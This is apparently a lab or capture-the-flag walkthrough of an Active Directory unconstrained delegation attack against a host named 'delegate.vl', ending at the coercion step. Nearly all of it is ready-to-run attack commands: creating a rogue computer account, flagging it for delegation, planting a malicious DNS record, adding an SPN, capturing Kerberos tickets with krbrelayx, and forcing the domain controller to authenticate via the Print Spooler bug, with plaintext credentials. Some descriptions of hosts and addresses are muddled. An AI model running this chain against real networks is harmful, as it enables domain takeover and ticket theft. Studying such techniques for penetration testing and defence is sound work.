**Unconstrained Delegation** is a configuration in Active Directory environments where a service account can impersonate users to access other services. It works by allowing the service to obtain and use the Kerberos tickets (TGTs—Ticket Granting Tickets) of users who authenticate to it, enabling potential unauthorised access to network resources.

With `SeEnableDelegationPrivilege` permission set, it is possible to perform a Unconstrained Delegation attack

```bash
*Evil-WinRM* PS C:\windows\tasks> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
```

Create a new computer account:

```bash
addcomputer.py -dc-ip 10.10.121.188 -computer-name evilcomputer -computer-pass 'Password123!' delegate.vl/N.Thompson:KALEB_2341
```

Enable unconstrained delegation on the computer account `evilcomputer$` by setting the `TRUSTED_FOR_DELEGATION` flag in Active Directory.

```bash
bloodyAD -u N.Thompson -p KALEB_2341 -d delegate.vl --host DC1.delegate.vl add uac 'evilcomputer$' -f TRUSTED_FOR_DELEGATION
```

Create a malicious DNS record for `DC1.delegate.vl` pointing to `10.8.6.108` on the target DNS server `10.10.83.72 (attacking host)` using the credentials of the `evilcomputer$` computer account. Any authentication attempt to `evilcomputer.delegate.vl` is directed to the attacking host.

```bash
python3 dnstool.py -u 'delegate.vl\evilcomputer$' -p 'Password123' -r evilcomputer.delegate.vl -d 10.8.6.108 --action add DC1.delegate.vl -dns-ip 10.10.83.72
```

Wait about 1 minute

Query the DNS server at `10.10.83.72` for the IP address of `evilcomputer.delegate.vl`.

```bash
nslookup evilcomputer.delegate.vl 10.10.83.72
```

Add the SPN `cifs/evilcomputer.delegate.vl` to the `evilcomputer$` account in Active Directory using the credentials of `evilcomputer$`

```bash
python3 addspn.py DC1.delegate.vl -u 'delegate.vl\evilcomputer$' -p Password123 --spn 'cifs/evilcomputer.delegate.vl' -t 'evilcomputer$' {--additional} 
```

Starts `krbrelayx` using the credentials for `evilcomputer$`, to listen on `10.8.6.108` for incoming Kerberos authentication requests and capture any tickets sent to it.

```bash
sudo python3 /opt/krbrelayx/krbrelayx.py --krbsalt 'delegate\evilcomputer$' --krbpass 'Password123' --interface-ip 10.8.6.108
```

Trigger the Print Spooler service on `dc1.delegate.vl` to authenticate to `evilcomputer.delegate.vl` using the credentials of `evilcomputer$`, forcing the domain controller to send its authentication to your attacker machine.

```bash
python3 printerbug.py 'delegate.vl/evilcomputer$:Password123@dc1.delegate.vl' evilcomputer.delegate.vl
```